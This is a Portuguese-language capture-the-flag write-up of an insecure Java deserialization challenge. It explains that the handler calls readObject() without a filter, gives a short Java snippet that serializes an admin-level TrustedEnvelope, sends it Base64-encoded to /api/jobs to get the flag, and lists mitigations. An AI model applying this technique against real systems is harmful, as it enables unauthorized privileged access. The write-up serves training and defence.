# Write-up — M07 Desserialização Insegura em Java

## Visão Geral do Vetor
A classe `DeserializeHandler` cria um `ObjectInputStream` sobre qualquer payload enviado e chama `readObject()` sem `ObjectInputFilter`. Como a aplicação inclui a classe `TrustedEnvelope`, basta enviar um objeto legítimo serializado com `action=admin` para obter a flag, mas o cenário também permite explorar cadeias de gadgets caso existam no classpath.

## Passo a Passo
1. Escreva um pequeno programa Java:
   ```java
   TrustedEnvelope env = new TrustedEnvelope("admin", "audit");
   ByteArrayOutputStream baos = new ByteArrayOutputStream();
   ObjectOutputStream oos = new ObjectOutputStream(baos);
   oos.writeObject(env);
   String base64 = Base64.getEncoder().encodeToString(baos.toByteArray());
   ```
2. Envie o valor Base64 para `/api/jobs` no campo `payload`.
3. A resposta virá com o corpo contendo a flag.

## Evidências
- Resposta HTTP 200 retornando `ITAU2025{...}` imediatamente após o POST.
- Logs da aplicação indicando desserialização da classe `com.itau.ctf.TrustedEnvelope`.

## Mitigações Recomendadas
- Aplicar `ObjectInputFilter` restritivo ou migrar para formatos seguros (JSON, protobuf).
- Verificar assinaturas ou mac dos objetos antes de desserializar.
- Manter lista de classes permitidas explicitamente.
